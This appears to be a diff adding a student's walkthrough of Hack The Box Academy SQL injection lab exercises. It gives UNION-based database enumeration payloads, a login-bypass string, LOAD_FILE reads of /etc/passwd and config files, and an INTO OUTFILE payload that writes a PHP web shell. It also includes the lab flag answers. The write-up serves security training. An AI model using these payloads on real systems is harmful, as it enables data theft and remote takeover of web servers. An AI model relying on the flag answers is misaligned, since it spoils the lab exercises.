@@ -313,9 +313,43 @@ Payload: `cn' union select 1,user(),3,4-- -`
 ### Question:
 ![](./attachments/Pasted%20image%2020220512175803.png)
 
+First we need to get an overview of what databases in the DBMS We can utilize `INFORMATION_SCHEMA.SCHEMATA` for this. 
 
+Payload: `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
 
-**Answer:** ``
+![](Pasted%20image%2020220602113519.png)
+
+Besides the defualt one we have two databases `dev` and `ilfreight`.
+
+In order to see which one we are accessing by default we can use `database()`.
+
+Payload: `cn' UNION select 1,database(),2,3-- -`
+
+![](Pasted%20image%2020220602114220.png)
+
+We are in the correct database.
+
+Now for finding the tables:
+
+Payload: `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -`
+
+![](Pasted%20image%2020220602114330.png)
+
+Great, the `users` table was what we where looking for.
+
+Now we can get the colums of that table.
+
+Payload: `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -`
+
+![](Pasted%20image%2020220602114815.png)
+
+Now that we have all the information we need, we can extract the password.
+
+Payload: `cn' UNION select 1, username, password, 4 from ilfreight.users-- -`
+
+![](Pasted%20image%2020220602115214.png)
+
+**Answer:** `9da2c9bcdf39d8610954e0e11ea8f45f`
 
 ---
 ## Reading Files
@@ -324,8 +358,53 @@ Payload: `cn' union select 1,user(),3,4-- -`
 
 *Hint: Once you identify the name of the imported configuration file, try to read the source of these files.*
 
+Like we saw in a previous question we can use `user()` to see which user is running the database, which means it is the DBA (DataBase Administrator).
 
-**Answer:** ``
+Payload: `cn' UNION SELECT 1, user(), 3, 4-- -`
+
+![](Pasted%20image%2020220602120341.png)
+
+Looks like the databse is running as `root`.
+
+Now we need to foind out what privileges the user has. 
+
+Payload: `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
+
+![](Pasted%20image%2020220602120501.png)
+
+`Y` means `yes` confirming that we have superuser privileges.
+
+We need to dig a little deeper into our privileges.
+
+Payload: `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
+
+![](Pasted%20image%2020220602121644.png)
+
+We have `FILE` permission meaning we can load files and maybe even write files.
+
+We can try and read the `/etc/passwd` file. 
+
+Payload: `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
+
+![](Pasted%20image%2020220602122325.png)
+
+Great! We have access.
+
+We know that the page we are working on is `search.php` and that the default Apache web directory is `/var/www/html`. Maybe we can get the soruce code of the file?
+
+Payload: `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
+
+Clicking `CTRL + U` to view the soruce code.
+
+![](Pasted%20image%2020220602123309.png)
+
+There is a config.php file. Let's get it.
+
+Payload: `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -`
+
+![](Pasted%20image%2020220602123504.png)
+
+**Answer:** `dB_pAssw0rd_iS_flag!`
 
 ---
 ## Writing Files
@@ -334,9 +413,31 @@ Payload: `cn' union select 1,user(),3,4-- -`
 
 *Hint: It's one directory away from you!*
 
+First, we need to confirm that we have write access to the system. 
 
+Payload: `cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
 
-**Answer:** ``
+![](Pasted%20image%2020220602125846.png)
+
+`SECURE_FILE_PRIV` is empty, meaning we can read and write to any location.
+
+In order to test if this is true, we can write a file to the web root directory and try and access it via the browser.
+
+Payload: `cn' union select 1,'File written successfully!',3,4,5 into outfile '/var/www/html/hax.txt'-- -`
+
+![](Pasted%20image%2020220602130443.png)
+
+We got access to the file, confirming that we have write access to the system.
+
+Let's upload a shell.
+
+Payload: `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -`
+
+Now we can execute commands via the URL. Looking around for a bit, we find the flag.
+
+![](Pasted%20image%2020220602132121.png)
+
+**Answer:** `d2b5b27ae688b6a0f1d21b7d3a0798cd`
 
 ---
 ## Skills Assessment
@@ -345,9 +446,41 @@ Payload: `cn' union select 1,user(),3,4-- -`
 
 *Hint: Try to read files you know to find a location you can write to.*
 
+We get a login page:
 
+![](Pasted%20image%2020220602134157.png)
 
-**Answer:** ``
+First, we can use a simple injection to bypass the login page.
+
+Payload for username field: `' OR 1=1 -- -`
+
+![](Pasted%20image%2020220602134321.png)
+
+On the new page there is a search field, maybe we can exploit that too.
+
+We will try to make an injection that tells us how many columns the database being displayed on the page has.
+
+Payload: `' order by 5-- -` 
+
+It has 5 columns.
+
+We can now make a union attack.
+
+Payload: `' union select 1,user(),3,4,5-- -`
+
+We will try to upload a shell script right away.
+
+Payload: `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -`
+
+![](Pasted%20image%2020220608150949.png)
+
+Success! We can execute commands.
+
+Cat the flag:
+
+![](Pasted%20image%2020220608150753.png)
+
+**Answer:** `528d6d9cedc2c7aab146ef226e918396`
 
 ---
 **Tags:** [[Hack The Box Academy]]
